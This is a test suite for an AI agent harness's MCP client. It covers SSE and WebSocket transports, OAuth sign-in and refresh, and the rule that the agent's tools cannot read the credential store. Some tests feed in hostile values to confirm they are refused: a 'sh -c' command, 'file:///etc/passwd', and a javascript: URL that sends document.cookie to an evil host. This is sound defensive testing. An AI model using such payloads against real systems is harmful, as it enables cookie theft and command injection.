// The remote transports beyond Streamable HTTP (HTTP+SSE, WebSocket) and
// OAuth sign-in, against local fixtures.

import { afterAll, afterEach, describe, expect, test } from "bun:test";
import { existsSync, readFileSync, rmSync, statSync } from "fs";
import { isolate, tempDir } from "./helpers/isolate";

const iso = isolate();
const { McpClient, McpAuthError, transportOf, sseTiming } = await import("../src/mcp/client");
const { McpManager, SignInReplaced } = await import("../src/mcp/manager");
const { signIn, oauthFor, parseChallenge, canonicalResource, discoverAuthServer, discoverResource, hasOAuthTokens, isWebUrl } = await import("../src/mcp/oauth");
const { paths } = await import("../src/config/paths");
const { startSseMcpServer, startWsMcpServer, startOAuthMcpServer, browse } = await import("./fixtures/mcp-remote-servers");
import type { McpClient as McpClientT } from "../src/mcp/client";

const WORK = tempDir("harness-mcp-remote-");
const clients: McpClientT[] = [];
const stops: (() => void)[] = [];
function client(cfg: ConstructorParameters<typeof McpClient>[1], opts: ConstructorParameters<typeof McpClient>[4] = {}): McpClientT {
    const c = new McpClient("remote", cfg, WORK, undefined, opts);
    clients.push(c);
    return c;
}
afterAll(async () => {
    await Promise.all(clients.map((c) => c.close()));
    for (const s of stops) s();
    rmSync(WORK, { recursive: true, force: true });
    iso.cleanup();
});

const textOf = (r: { content: { type: string; text?: string }[] }) => r.content.map((c) => c.text ?? "").join("");

describe("transportOf", () => {
    test("type wins; else a ws:// URL, a URL, a command", () => {
        expect(transportOf({ url: "https://x/mcp" })).toBe("http");
        expect(transportOf({ url: "wss://x/mcp" })).toBe("ws");
        expect(transportOf({ type: "sse", url: "https://x/sse" })).toBe("sse");
        expect(transportOf({ type: "streamable-http", url: "https://x" })).toBe("http");
        expect(transportOf({ command: "x" })).toBe("stdio");
        expect(transportOf({})).toBeUndefined();
    });

    test("a url always means a remote server: type stdio can't make one run a command", () => {
        // The approval card shows the URL for any server that has one; it must not spawn the command instead.
        const cfg = { type: "stdio" as const, url: "https://mcp.example.com", command: "sh", args: ["-c", "echo pwned"] };
        expect(transportOf(cfg)).toBe("http");
        expect(new McpClient("x", cfg, WORK).transport).toBe("http");
    });

    test("a type without what it needs is refused up front", () => {
        expect(() => new McpClient("x", { type: "sse" }, WORK)).toThrow(/has type "sse" but no "url"/);
        expect(() => new McpClient("x", { type: "stdio" }, WORK)).toThrow(/has type "stdio" but no "command"/);
        expect(() => new McpClient("x", { type: "carrier-pigeon" as any }, WORK)).toThrow(/unknown type "carrier-pigeon"/);
    });
});

describe("HTTP+SSE transport", () => {
    test("connects through the endpoint event, lists and calls tools, sends configured headers on the GET and every POST", async () => {
        const f = startSseMcpServer();
        stops.push(f.stop);
        const c = client({ type: "sse", url: f.url, headers: { "X-Team": "blue" } });
        await c.connect();
        expect(c.era).toBe("legacy");
        expect((await c.listTools()).map((t) => t.name)).toEqual(["echo", "ask_name"]);
        expect(textOf(await c.callTool("echo", { text: "over sse" }))).toBe("echo: over sse");
        expect(f.getHeaders[0]!["x-team"]).toBe("blue");
        expect(f.getHeaders[0]!.accept).toBe("text/event-stream");
        expect(f.postHeaders.every((h) => h["x-team"] === "blue")).toBe(true);
        expect((await c.readResource("remote://note"))[0]!.text).toBe("a remote note");
    });

    test("a server request on the stream is answered by POST (elicitation)", async () => {
        const f = startSseMcpServer();
        stops.push(f.stop);
        const c = client({ type: "sse", url: f.url }, { interactive: true });
        await c.connect();
        const r = await c.callTool("ask_name", {}, undefined, undefined, { elicit: async () => ({ action: "accept", content: { name: "Lin" } }) });
        expect(JSON.parse(textOf(r))).toEqual({ action: "accept", content: { name: "Lin" } });
    });

    test("the stream dropping fails open requests and reports the exit", async () => {
        const f = startSseMcpServer();
        stops.push(f.stop);
        const c = client({ type: "sse", url: f.url });
        let exited = 0;
        c.onExit = () => exited++;
        await c.connect();
        f.dropStreams();
        await Bun.sleep(50);
        expect(exited).toBe(1);
        await expect(c.callTool("echo", { text: "x" })).rejects.toThrow(/SSE stream closed/);
    });

    test("an endpoint on another origin is refused (headers never go there)", async () => {
        const f = startSseMcpServer({ endpoint: () => "http://evil.example/messages" });
        stops.push(f.stop);
        await expect(client({ type: "sse", url: f.url }).connect()).rejects.toThrow(/another origin/);
    });

    test("a stream that never names its endpoint times out instead of hanging", async () => {
        // Covered by the 30s connect deadline; here a non-stream answer fails at once.
        const f = startSseMcpServer({ status: 500 });
        stops.push(f.stop);
        const t0 = Date.now();
        await expect(client({ type: "sse", url: f.url }).connect()).rejects.toThrow(/HTTP 500/);
        expect(Date.now() - t0).toBeLessThan(2000);
    });

    test("a 401 on the stream is an auth error when OAuth is on", async () => {
        const f = startSseMcpServer({ status: 401 });
        stops.push(f.stop);
        const err = await client({ type: "sse", url: f.url }, { auth: { header: async () => undefined, unauthorized: async () => false } })
            .connect()
            .catch((e) => e);
        expect(err).toBeInstanceOf(McpAuthError);
        expect(err.challenge).toContain("Bearer");
    });

    test("a refused connection fails fast", async () => {
        const t0 = Date.now();
        await expect(client({ type: "sse", url: "http://127.0.0.1:9/sse" }).connect()).rejects.toThrow();
        expect(Date.now() - t0).toBeLessThan(3000);
    });
});

describe("HTTP+SSE stream lifetime", () => {
    test("the connect deadline covers opening the stream, not the stream once it's open", async () => {
        const f = startSseMcpServer();
        stops.push(f.stop);
        const saved = sseTiming.connectMs;
        sseTiming.connectMs = 300;
        try {
            const c = client({ type: "sse", url: f.url });
            let exited = 0;
            c.onExit = () => exited++;
            await c.connect();
            expect(textOf(await c.callTool("echo", { text: "first" }))).toBe("echo: first");
            await Bun.sleep(600); // well past the deadline, with the stream idle
            expect(exited).toBe(0);
            expect(textOf(await c.callTool("echo", { text: "later" }))).toBe("echo: later");
        } finally {
            sseTiming.connectMs = saved;
        }
    });

    test("a server that never names its endpoint still fails at the deadline", async () => {
        const f = startSseMcpServer({ silent: true });
        stops.push(f.stop);
        const saved = sseTiming.connectMs;
        sseTiming.connectMs = 200;
        try {
            await expect(client({ type: "sse", url: f.url }).connect()).rejects.toThrow(/no endpoint event|didn.t answer within/);
        } finally {
            sseTiming.connectMs = saved;
        }
    });
});

describe("WebSocket transport", () => {
    test("connects with subprotocol mcp and the configured headers; lists and calls tools", async () => {
        const f = startWsMcpServer();
        stops.push(f.stop);
        const c = client({ url: f.url, headers: { Authorization: "Bearer ws-token" } });
        await c.connect();
        expect(f.upgrades[0]!.protocol).toBe("mcp");
        expect(f.upgrades[0]!.headers.authorization).toBe("Bearer ws-token");
        expect((await c.listTools()).map((t) => t.name)).toEqual(["echo", "ask_name"]);
        expect(textOf(await c.callTool("echo", { text: "over ws" }))).toBe("echo: over ws");
    });

    test("server requests over the socket are answered (elicitation)", async () => {
        const f = startWsMcpServer();
        stops.push(f.stop);
        const c = client({ type: "ws", url: f.url }, { interactive: true });
        await c.connect();
        const r = await c.callTool("ask_name", {}, undefined, undefined, { elicit: async () => ({ action: "decline" }) });
        expect(JSON.parse(textOf(r))).toEqual({ action: "decline" });
    });

    test("the server closing the socket fails open requests and reports the exit", async () => {
        const f = startWsMcpServer();
        stops.push(f.stop);
        const c = client({ url: f.url });
        let exited = 0;
        c.onExit = () => exited++;
        await c.connect();
        f.closeAll(1011);
        await Bun.sleep(100);
        expect(exited).toBe(1);
        await expect(c.callTool("echo", { text: "x" })).rejects.toThrow(/WebSocket closed \(1011/);
    });

    test("nothing listening: fails fast", async () => {
        const t0 = Date.now();
        await expect(client({ url: "ws://127.0.0.1:9/" }).connect()).rejects.toThrow(/WebSocket/);
        expect(Date.now() - t0).toBeLessThan(3000);
    });
});

describe("remote auth across transports", () => {
    test.each(["header", "path", "root"] as const)("WebSocket: OAuth discovery looks at the server's http address (metadata %s)", async (prmAt) => {
        const f = startOAuthMcpServer({ prmAt });
        stops.push(f.stop);
        const ws = f.url.replace(/^http:/, "ws:");
        const challenge = prmAt === "header" ? `Bearer resource_metadata="${f.issuer}/meta/prm"` : "";
        // The metadata names the https resource: that's this server, not someone else's.
        expect(await discoverResource(ws, challenge)).toEqual({ resource: f.url, authServer: f.issuer, scopes: ["mcp:read", "mcp:write"] });
        expect(await discoverAuthServer(f.issuer)).toMatchObject({ issuer: f.issuer });
    });

    test("WebSocket: with no metadata at all, the server's http origin is its authorization server", async () => {
        const f = startOAuthMcpServer({ prmAt: "header" });
        stops.push(f.stop);
        const r = await discoverResource(f.url.replace(/^http:/, "ws:"), "");
        expect(r).toEqual({ resource: f.url, authServer: f.issuer, scopes: undefined });
    });

    /** An McpAuth whose token can be rotated: unauthorized() picks up the current one if it changed. */
    function rotating(start: string, current: () => string) {
        let have = start;
        const calls = { unauthorized: 0 };
        return {
            calls,
            auth: {
                header: async () => `Bearer ${have}`,
                unauthorized: async () => {
                    calls.unauthorized++;
                    if (current() === have) return false;
                    have = current();
                    return true;
                },
            },
        };
    }

    test("SSE: a POST refused with 401 gets a fresh token and one more try", async () => {
        const token = { value: "one" };
        const f = startSseMcpServer({ postToken: token });
        stops.push(f.stop);
        const r = rotating("one", () => token.value);
        const c = client({ type: "sse", url: f.url }, { auth: r.auth });
        await c.connect();
        await Bun.sleep(50); // notifications/initialized is on its way: not part of this
        token.value = "two";
        expect(textOf(await c.callTool("echo", { text: "after refresh" }))).toBe("echo: after refresh");
        expect(r.calls.unauthorized).toBe(1);
        expect(f.postHeaders.at(-1)!.authorization).toBe("Bearer two");
    });

    test("SSE: a POST still refused needs signing in (McpAuthError), not a plain HTTP error", async () => {
        const token = { value: "one" };
        const f = startSseMcpServer({ postToken: token });
        stops.push(f.stop);
        const c = client({ type: "sse", url: f.url }, { auth: rotating("one", () => "one").auth });
        await c.connect();
        await Bun.sleep(50);
        token.value = "revoked";
        const e = await c.callTool("echo", { text: "x" }).catch((e) => e);
        expect(e).toBeInstanceOf(McpAuthError);
    });

    test("WebSocket: an upgrade refused with 401 is reported as needing sign-in", async () => {
        const f = startWsMcpServer({ token: { value: "good" } });
        stops.push(f.stop);
        const e = await client({ url: f.url }, { auth: rotating("bad", () => "bad").auth }).connect().catch((e) => e);
        expect(e).toBeInstanceOf(McpAuthError);
        // Without OAuth, the old advice: add a header.
        await expect(client({ url: f.url }).connect()).rejects.toThrow(/requires authorization/);
    });

    test("WebSocket: a refreshed token gets the upgrade through", async () => {
        const token = { value: "fresh" };
        const f = startWsMcpServer({ token });
        stops.push(f.stop);
        const r = rotating("stale", () => token.value);
        const c = client({ url: f.url }, { auth: r.auth });
        await c.connect();
        expect(textOf(await c.callTool("echo", { text: "ok" }))).toBe("echo: ok");
        expect(r.calls.unauthorized).toBe(1);
    });

    test("closing a remote server on purpose isn't reported as it exiting", async () => {
        const sse = startSseMcpServer();
        const ws = startWsMcpServer();
        stops.push(sse.stop, ws.stop);
        for (const cfg of [{ type: "sse" as const, url: sse.url }, { url: ws.url }]) {
            const c = client(cfg);
            let exited = 0;
            c.onExit = () => exited++;
            await c.connect();
            await c.close();
            await Bun.sleep(50);
            expect(exited).toBe(0);
        }
    });
});

describe("OAuth", () => {
    afterEach(() => {
        if (existsSync(paths.mcpOAuth())) rmSync(paths.mcpOAuth());
    });

    test("parseChallenge and canonicalResource", () => {
        expect(parseChallenge('Bearer resource_metadata="https://a/b", scope="x y", error=insufficient_scope')).toEqual({ resource_metadata: "https://a/b", scope: "x y", error: "insufficient_scope" });
        expect(parseChallenge("Basic realm=x")).toEqual({});
        expect(canonicalResource("https://MCP.example.com/")).toBe("https://mcp.example.com");
        expect(canonicalResource("https://mcp.example.com/mcp#frag")).toBe("https://mcp.example.com/mcp");
    });

    for (const prmAt of ["header", "path", "root"] as const) {
        test(`signing in end to end (resource metadata from the ${prmAt}): register, PKCE, resource, iss; tokens stored privately; the server connects`, async () => {
            const f = startOAuthMcpServer({ prmAt });
            stops.push(f.stop);
            const m = new McpManager(WORK, () => ({ mcpServers: { secure: { url: f.url } } }), false, undefined, true);
            m.load();
            await m.startAll();
            const st = m.servers.get("secure")!;
            expect(st.status).toBe("needs-auth");
            let opened = "";
            await m.signIn("secure", async (url) => {
                opened = url;
                // The "browser", after the link is shown.
                setTimeout(() => void browse(url), 10);
            });
            expect(st.status).toBe("connected");
            expect(st.tools.map((t) => t.name)).toEqual(["echo", "ask_name"]);
            const auth = new URL(opened);
            expect(auth.searchParams.get("code_challenge_method")).toBe("S256");
            expect(auth.searchParams.get("resource")).toBe(f.url);
            expect(auth.searchParams.get("scope")).toBe("mcp:read mcp:write");
            expect(auth.searchParams.get("redirect_uri")).toMatch(/^http:\/\/127\.0\.0\.1:\d+\/callback$/);
            expect(f.registrations).toHaveLength(1);
            expect(f.registrations[0]).toMatchObject({ application_type: "native", token_endpoint_auth_method: "none", grant_types: ["authorization_code", "refresh_token"] });
            expect(f.tokenRequests[0]).toMatchObject({ grant_type: "authorization_code", resource: f.url });
            expect(statSync(paths.mcpOAuth()).mode & 0o777).toBe(0o600);
            expect(readFileSync(paths.mcpOAuth(), "utf-8")).toContain(f.issuer);
            expect(m.describe("secure")!.signedIn).toBe(true);
            await m.closeAll();
        });
    }

    test("an expired token is refreshed before it's sent; a token the server stops taking is refreshed on its 401", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        f.expiresIn = 30; // inside the refresh margin: refreshed before it's first sent
        const cfg = { url: f.url };
        await signIn("s", cfg, { open: (u) => void browse(u).catch(() => {}) });
        f.expiresIn = 3600;
        const c = client(cfg, { auth: oauthFor("s", cfg) });
        await c.connect();
        await c.listTools();
        expect(f.tokenRequests.filter((t) => t.grant_type === "refresh_token")).toHaveLength(1);
        const before = f.tokenRequests.length;
        f.valid.clear(); // revoked server-side
        expect(textOf(await c.callTool("echo", { text: "still here" }))).toBe("echo: still here");
        expect(f.tokenRequests.slice(before).map((t) => t.grant_type)).toEqual(["refresh_token"]);
        // Several requests refused at once: one refresh, and every one of them goes through on its token.
        const again = f.tokenRequests.length;
        await Bun.sleep(10);
        f.valid.clear();
        const auth = oauthFor("s", cfg)!;
        const tries = await Promise.all([auth.unauthorized(""), auth.unauthorized(""), auth.unauthorized("")]);
        expect(tries).toEqual([true, true, true]);
        expect(f.tokenRequests.slice(again).map((t) => t.grant_type)).toEqual(["refresh_token"]);
    });

    test("a refused refresh drops the tokens: the server asks to sign in again", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        const cfg = { url: f.url };
        await signIn("s", cfg, { open: (u) => void browse(u).catch(() => {}) });
        f.valid.clear();
        f.refuseRefresh = true;
        const m = new McpManager(WORK, () => ({ mcpServers: { s: cfg } }), false);
        m.load();
        await m.startAll();
        expect(m.servers.get("s")!.status).toBe("needs-auth");
        expect(hasOAuthTokens("s", cfg)).toBe(false);
    });

    test("insufficient_scope isn't fixed by a refresh", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        const cfg = { url: f.url };
        await signIn("s", cfg, { open: (u) => void browse(u).catch(() => {}) });
        f.valid.clear();
        f.challengeExtra = 'error="insufficient_scope", scope="mcp:admin"';
        const before = f.tokenRequests.length;
        await expect(client(cfg, { auth: oauthFor("s", cfg) }).connect()).rejects.toBeInstanceOf(McpAuthError);
        expect(f.tokenRequests.length).toBe(before);
    });

    test("a response with another state is ignored; the right one still completes", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        f.stateOverride = "forged";
        let link = "";
        const done = signIn("s", { url: f.url }, { open: (u) => void (link = u) });
        while (!link) await Bun.sleep(5);
        const r = await fetch(link, { redirect: "follow" });
        expect(r.status).toBe(400);
        expect(await r.text()).toContain("isn't the one");
        await browse(link);
        await done;
        expect(hasOAuthTokens("s", { url: f.url })).toBe(true);
    });

    test("an iss that isn't the authorization server's is rejected before the code is used", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        f.issOverride = "https://evil.example";
        await expect(signIn("s", { url: f.url }, { open: (u) => void browse(u).catch(() => {}) })).rejects.toThrow(/wrong authorization server/);
        expect(f.tokenRequests).toHaveLength(0);
    });

    test("a missing iss is rejected when the server says it sends one", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        f.issOverride = null;
        await expect(signIn("s", { url: f.url }, { open: (u) => void browse(u).catch(() => {}) })).rejects.toThrow(/wrong authorization server/);
    });

    test("the user declining, a timeout, and a cancel each end the sign-in with a clear reason", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        f.deny = true;
        await expect(signIn("s", { url: f.url }, { open: (u) => void browse(u).catch(() => {}) })).rejects.toThrow("you declined the sign-in");
        await expect(signIn("s", { url: f.url }, { open: () => {}, timeoutMs: 100 })).rejects.toThrow(/wasn't finished within/);
        const ac = new AbortController();
        const p = signIn("s", { url: f.url }, { open: () => void setTimeout(() => ac.abort(), 20), signal: ac.signal });
        await expect(p).rejects.toThrow("sign-in cancelled");
    });

    test("no registration endpoint and no clientId: says how to configure one; a configured clientId skips registration", async () => {
        const f = startOAuthMcpServer({ register: false });
        stops.push(f.stop);
        await expect(signIn("s", { url: f.url }, { open: (u) => void browse(u).catch(() => {}) })).rejects.toThrow(/"oauth": \{ "clientId"/);
        // The fixture's token endpoint checks client_id against the one the code was issued to.
        await signIn("s", { url: f.url, oauth: { clientId: "preset" } }, { open: (u) => void browse(u).catch(() => {}) });
        expect(f.registrations).toHaveLength(0);
        expect(f.authorizeParams.at(-1)!.client_id).toBe("preset");
    });

    test("an authorization server without S256 PKCE is refused", async () => {
        const f = startOAuthMcpServer({ pkce: false });
        stops.push(f.stop);
        await expect(signIn("s", { url: f.url }, { open: (u) => void browse(u).catch(() => {}) })).rejects.toThrow(/PKCE with S256/);
    });

    test("metadata whose issuer doesn't match where it was fetched is refused", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        await expect(discoverAuthServer(`${f.issuer}/`)).resolves.toMatchObject({ issuer: f.issuer });
        await expect(discoverAuthServer(f.issuer.replace("127.0.0.1", "localhost"))).rejects.toThrow(/names issuer/);
    });

    test("signing in again reuses the registered client when its callback port is free", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        await signIn("s", { url: f.url }, { open: (u) => void browse(u).catch(() => {}) });
        await signIn("s", { url: f.url }, { open: (u) => void browse(u).catch(() => {}) });
        expect(f.registrations).toHaveLength(1);
        expect(f.authorizeParams[0]!.redirect_uri).toBe(f.authorizeParams[1]!.redirect_uri);
    });

    test("a token lost after connecting (revoked, refresh refused) shows the server as needing sign-in, from a tool call", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        const m = new McpManager(WORK, () => ({ mcpServers: { s: { url: f.url } } }), false);
        m.load();
        await m.startAll();
        await m.signIn("s", (u) => void browse(u).catch(() => {}));
        const st = m.servers.get("s")!;
        expect(st.status).toBe("connected");
        const echo = m.tools().find((t) => t.name === "mcp__s__echo")!;
        f.valid.clear();
        f.refuseRefresh = true;
        const r = await echo.run({ text: "x" }, { signal: new AbortController().signal } as any);
        expect(r.isError).toBe(true);
        expect(r.content).toMatch(/needs signing in again.*\/mcp/);
        expect(st.status).toBe("needs-auth");
        expect(st.client).toBeUndefined();
        expect(m.tools().some((t) => t.name === "mcp__s__echo")).toBe(false);
        // Signing in again brings it back.
        f.refuseRefresh = false;
        await m.signIn("s", (u) => void browse(u).catch(() => {}));
        expect(st.status).toBe("connected");
        await m.closeAll();
    });

    test("a token lost after connecting shows as needing sign-in when a changed list is fetched again", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        const m = new McpManager(WORK, () => ({ mcpServers: { s: { url: f.url } } }), false);
        m.load();
        await m.startAll();
        await m.signIn("s", (u) => void browse(u).catch(() => {}));
        const st = m.servers.get("s")!;
        f.valid.clear();
        f.refuseRefresh = true;
        // As a list_changed notification does.
        st.client!.onResourcesChanged!();
        for (let i = 0; i < 100 && st.status === "connected"; i++) await Bun.sleep(10);
        expect(st.status).toBe("needs-auth");
        await m.closeAll();
    });

    test("a token lost after connecting shows as needing sign-in from a prompt or resource read too", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        const m = new McpManager(WORK, () => ({ mcpServers: { s: { url: f.url } } }), false);
        m.load();
        await m.startAll();
        await m.signIn("s", (u) => void browse(u).catch(() => {}));
        f.valid.clear();
        f.refuseRefresh = true;
        await expect(m.readResource("s", "fixture://readme", {})).rejects.toThrow(/needs signing in again/);
        expect(m.servers.get("s")!.status).toBe("needs-auth");
        await m.closeAll();
    });

    test("a preset client secret goes in Basic auth unless the server lists only client_secret_post (RFC 8414's default is basic)", async () => {
        const f = startOAuthMcpServer({ register: false });
        stops.push(f.stop);
        const cfg = { url: f.url, oauth: { clientId: "preset-client", clientSecret: "preset-secret" } };
        await signIn("s", cfg, { open: (u) => void browse(u).catch(() => {}) });
        expect(f.tokenAuth).toEqual(["basic preset-client:preset-secret"]);
        f.metaExtra = { token_endpoint_auth_methods_supported: ["client_secret_post"] };
        await signIn("s2", cfg, { open: (u) => void browse(u).catch(() => {}) });
        expect(f.tokenAuth.at(-1)).toBe("post");
        expect(f.tokenRequests.at(-1)).toMatchObject({ client_id: "preset-client", client_secret: "preset-secret" });
        // Scopes written as Claude Code's .mcp.json has them: one space-separated string.
        await signIn("s3", { ...cfg, oauth: { ...cfg.oauth, scopes: "mcp:read  custom" } }, { open: (u) => void browse(u).catch(() => {}) });
        expect(f.authorizeParams.at(-1)!.scope).toBe("mcp:read custom");
    });

    test("sign out forgets the tokens and the server asks again", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        const m = new McpManager(WORK, () => ({ mcpServers: { s: { url: f.url } } }), false);
        m.load();
        await m.startAll();
        await m.signIn("s", (u) => void browse(u).catch(() => {}));
        expect(m.servers.get("s")!.status).toBe("connected");
        expect(await m.signOut("s")).toBe(true);
        expect(m.servers.get("s")!.status).toBe("needs-auth");
        expect(m.signedIn("s")).toBe(false);
        await m.closeAll();
    });

    test("an authorization endpoint that isn't a web page (javascript:, file:) is refused before anything opens it", async () => {
        expect(isWebUrl("https://a/b")).toBe(true);
        expect(isWebUrl("javascript:alert(1)//")).toBe(false);
        expect(isWebUrl("file:///etc/passwd")).toBe(false);
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        f.metaExtra = { authorization_endpoint: "javascript:fetch('https://evil/?'+document.cookie)//" };
        let opened = false;
        await expect(signIn("s", { url: f.url }, { open: () => void (opened = true) })).rejects.toThrow(/authorization endpoint isn't an http\(s\) URL/);
        expect(opened).toBe(false);
    });

    test("signing in again replaces the sign-in still waiting, which frees its fixed callback port", async () => {
        const f = startOAuthMcpServer();
        stops.push(f.stop);
        const probe = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch: () => new Response() });
        const port = probe.port;
        probe.stop(true);
        const m = new McpManager(WORK, () => ({ mcpServers: { s: { url: f.url, oauth: { callbackPort: port } } } }), false);
        m.load();
        await m.startAll();
        // The first link is never opened (a blocked pop-up).
        let firstShown!: () => void;
        const shown = new Promise<void>((r) => (firstShown = r));
        const first = m.signIn("s", () => firstShown()).catch((e) => e);
        await shown;
        await m.signIn("s", (u) => void browse(u).catch(() => {}));
        expect(await first).toBeInstanceOf(SignInReplaced);
        expect(m.servers.get("s")!.status).toBe("connected");
        await m.closeAll();
    });

    test("signing in to a stdio server, or one not approved, is refused", async () => {
        const m = new McpManager(WORK, () => ({ mcpServers: { local: { command: "true" } } }), false);
        m.load();
        await expect(m.signIn("local", () => {})).rejects.toThrow(/nothing to sign in to/);
        await expect(m.signIn("nope", () => {})).rejects.toThrow(/no MCP server named/);
    });
});

describe("the token store is part of the credential store", () => {
    test("the agent's file tools can't read it, and the sandbox can't either", async () => {
        const { PermissionChecker } = await import("../src/permissions/checker");
        const { BUILTIN_TOOLS } = await import("../src/tools/index");
        const { sandboxPolicy } = await import("../src/permissions/sandbox");
        const c = new PermissionChecker(() => ({ permissions: { allow: [], ask: [], deny: [] } }), WORK);
        const Read = BUILTIN_TOOLS.find((t) => t.name === "Read")!;
        const Grep = BUILTIN_TOOLS.find((t) => t.name === "Grep")!;
        for (const mode of ["auto", "bypassPermissions"] as const) {
            expect(c.check(Read, { file_path: paths.mcpOAuth() }, mode, WORK).behavior).toBe("deny");
            expect(c.check(Grep, { pattern: "x", path: paths.mcpOAuth() }, mode, WORK).behavior).toBe("deny");
        }
        const p = sandboxPolicy([WORK], { harnessHome: paths.home() });
        expect(p.unreadable.some((x: string) => x.endsWith("mcp-oauth.json"))).toBe(true);
    });
});
